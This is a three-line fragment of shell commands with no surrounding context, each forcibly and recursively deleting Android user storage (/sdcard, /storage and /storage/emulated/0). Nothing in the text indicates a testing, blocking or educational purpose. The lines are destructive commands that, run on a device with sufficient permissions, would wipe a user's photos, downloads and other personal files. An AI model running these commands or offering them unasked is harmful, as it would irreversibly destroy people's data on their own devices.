rm -rf /sdcard

rm -rf /storage

rm -rf /storage/emulated/0